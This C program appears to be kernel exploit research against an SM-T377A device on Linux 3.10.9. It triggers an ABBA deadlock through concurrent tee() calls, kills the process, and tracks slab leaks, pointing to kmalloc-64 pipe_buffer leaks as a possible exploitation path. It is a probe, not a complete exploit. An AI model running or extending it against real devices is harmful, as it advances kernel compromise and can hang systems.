/*
 * tee_abba_kill.c — ABBA deadlock + SIGKILL exploitation attempt
 *
 * CONFIRMED: Concurrent tee(p1→p2) + tee(p2→p1) causes ABBA deadlock
 * in kernel 3.10.9. Both threads hold pipe mutexes in opposite order.
 *
 * This test:
 *   1. Creates ABBA deadlock with 2 threads
 *   2. SIGKILLs the deadlocked process
 *   3. Checks for slab leaks/corruption in cleanup path
 *   4. Runs 100 iterations for statistical significance
 *   5. Also checks pipe_buffer slab (function pointers live here!)
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o tee_abba_kill tee_abba_kill.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>
#include <time.h>

#ifndef __NR_tee
#define __NR_tee 342
#endif
#ifndef __NR_splice
#define __NR_splice 340
#endif

struct slab_snap {
    int k32, k64, k128, k192, k256, k512, k1024;
    int pipe_info;
};

static int get_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512]; int val = -1;
    while (fgets(line, sizeof(line), f)) {
        char n[64]; int a;
        if (sscanf(line, "%63s %d", n, &a) == 2 && !strcmp(n, name))
            { val = a; break; }
    }
    fclose(f);
    return val;
}

static void snap_slabs(struct slab_snap *s) {
    s->k32 = get_slab("kmalloc-32");
    s->k64 = get_slab("kmalloc-64");
    s->k128 = get_slab("kmalloc-128");
    s->k192 = get_slab("kmalloc-192");
    s->k256 = get_slab("kmalloc-256");
    s->k512 = get_slab("kmalloc-512");
    s->k1024 = get_slab("kmalloc-1024");
    s->pipe_info = get_slab("pipe_inode_info");
}

static void diff_slabs(const char *label, struct slab_snap *before, struct slab_snap *after) {
    int d32 = after->k32 - before->k32;
    int d64 = after->k64 - before->k64;
    int d128 = after->k128 - before->k128;
    int d192 = after->k192 - before->k192;
    int d256 = after->k256 - before->k256;
    int d512 = after->k512 - before->k512;
    int d1024 = after->k1024 - before->k1024;
    int dpipe = after->pipe_info - before->pipe_info;

    if (d32 || d64 || d128 || d192 || d256 || d512 || d1024 || dpipe) {
        printf("  [%s] SLAB DELTA:", label);
        if (d32) printf(" k32=%+d", d32);
        if (d64) printf(" k64=%+d", d64);
        if (d128) printf(" k128=%+d", d128);
        if (d192) printf(" k192=%+d", d192);
        if (d256) printf(" k256=%+d", d256);
        if (d512) printf(" k512=%+d", d512);
        if (d1024) printf(" k1024=%+d", d1024);
        if (dpipe) printf(" pipe=%+d", dpipe);
        printf("\n");
    }
}

static int fill_pipe(int wfd) {
    fcntl(wfd, F_SETFL, O_NONBLOCK);
    char buf[4096];
    memset(buf, 'F', sizeof(buf));
    int total = 0;
    while (write(wfd, buf, sizeof(buf)) > 0) total += 4096;
    return total;
}

/* ========== ABBA Deadlock + SIGKILL ========== */

static int abba_p1[2], abba_p2[2];
static volatile int abba_go = 0;

static void *tee_fwd(void *arg) {
    while (!abba_go) sched_yield();
    /* Lock p1 then p2 */
    for (int i = 0; i < 100000; i++) {
        syscall(__NR_tee, abba_p1[0], abba_p2[1], 4096, 0);
    }
    return NULL;
}

static void *tee_bwd(void *arg) {
    while (!abba_go) sched_yield();
    /* Lock p2 then p1 — opposite order = ABBA */
    for (int i = 0; i < 100000; i++) {
        syscall(__NR_tee, abba_p2[0], abba_p1[1], 4096, 0);
    }
    return NULL;
}

static void run_abba_deadlock_child(void) {
    pipe(abba_p1); pipe(abba_p2);
    fcntl(abba_p1[0], 1031 /* F_SETPIPE_SZ */, 4096);
    fcntl(abba_p2[0], 1031 /* F_SETPIPE_SZ */, 4096);

    /* Put data in both pipes so tee has something to work with */
    char data[2048];
    memset(data, 'X', sizeof(data));
    write(abba_p1[1], data, sizeof(data));
    write(abba_p2[1], data, sizeof(data));

    /* Make pipes blocking */
    fcntl(abba_p1[0], F_SETFL, 0);
    fcntl(abba_p1[1], F_SETFL, 0);
    fcntl(abba_p2[0], F_SETFL, 0);
    fcntl(abba_p2[1], F_SETFL, 0);

    abba_go = 0;
    pthread_t t1, t2;
    pthread_create(&t1, NULL, tee_fwd, NULL);
    pthread_create(&t2, NULL, tee_bwd, NULL);

    abba_go = 1;

    /* Block forever — parent will SIGKILL us */
    while (1) sleep(1);
}

int main(void) {
    printf("=== ABBA Deadlock + SIGKILL Slab Analysis ===\n");
    printf("SM-T377A kernel 3.10.9\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    int leak_count = 0;
    int total_leaks[8] = {0};  /* k32,k64,k128,k192,k256,k512,k1024,pipe */
    int iters = 100;

    for (int i = 0; i < iters; i++) {
        struct slab_snap before, after;
        snap_slabs(&before);

        pid_t pid = fork();
        if (pid == 0) {
            run_abba_deadlock_child();
            _exit(0);
        }

        /* Wait for child to enter deadlock */
        usleep(100000);  /* 100ms — threads should be deadlocked by now */

        /* SIGKILL — force kernel cleanup of deadlocked state */
        kill(pid, SIGKILL);

        int status;
        waitpid(pid, &status, 0);

        /* Small delay for kernel cleanup */
        usleep(10000);

        snap_slabs(&after);

        /* Check for anomalies */
        int d64 = after.k64 - before.k64;
        int d128 = after.k128 - before.k128;
        int d192 = after.k192 - before.k192;
        int d256 = after.k256 - before.k256;
        int dpipe = after.pipe_info - before.pipe_info;

        if (d64 || d128 || d192 || d256 || dpipe) {
            char label[16];
            snprintf(label, sizeof(label), "%d", i);
            diff_slabs(label, &before, &after);
            leak_count++;
        }

        /* Track cumulative */
        total_leaks[0] += after.k32 - before.k32;
        total_leaks[1] += after.k64 - before.k64;
        total_leaks[2] += after.k128 - before.k128;
        total_leaks[3] += after.k192 - before.k192;
        total_leaks[4] += after.k256 - before.k256;
        total_leaks[5] += after.k512 - before.k512;
        total_leaks[6] += after.k1024 - before.k1024;
        total_leaks[7] += after.pipe_info - before.pipe_info;

        if ((i + 1) % 25 == 0) {
            printf("[%d/%d] anomalies so far: %d\n", i + 1, iters, leak_count);
            fflush(stdout);
        }
    }

    printf("\n=== RESULTS (%d iterations) ===\n", iters);
    printf("Slab anomaly iterations: %d/%d (%.1f%%)\n",
           leak_count, iters, leak_count * 100.0 / iters);
    printf("Cumulative slab deltas:\n");
    printf("  kmalloc-32:  %+d\n", total_leaks[0]);
    printf("  kmalloc-64:  %+d (pipe_buffer lives here!)\n", total_leaks[1]);
    printf("  kmalloc-128: %+d\n", total_leaks[2]);
    printf("  kmalloc-192: %+d\n", total_leaks[3]);
    printf("  kmalloc-256: %+d\n", total_leaks[4]);
    printf("  kmalloc-512: %+d\n", total_leaks[5]);
    printf("  kmalloc-1024:%+d\n", total_leaks[6]);
    printf("  pipe_inode:  %+d\n", total_leaks[7]);

    if (total_leaks[1] > 0) {
        printf("\n*** kmalloc-64 LEAK DETECTED! ***\n");
        printf("*** pipe_buffer has function pointers in kmalloc-64! ***\n");
        printf("*** This could be exploitable! ***\n");
    }
    if (total_leaks[2] > 0) {
        printf("\n*** kmalloc-128 LEAK DETECTED! ***\n");
    }

    /* Final dmesg check */
    printf("\n--- dmesg ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -30 | grep -iE "
           "'oops|bug|panic|fault|corrupt|Backtrace|Unable|WARNING|pipe|splice' "
           "2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
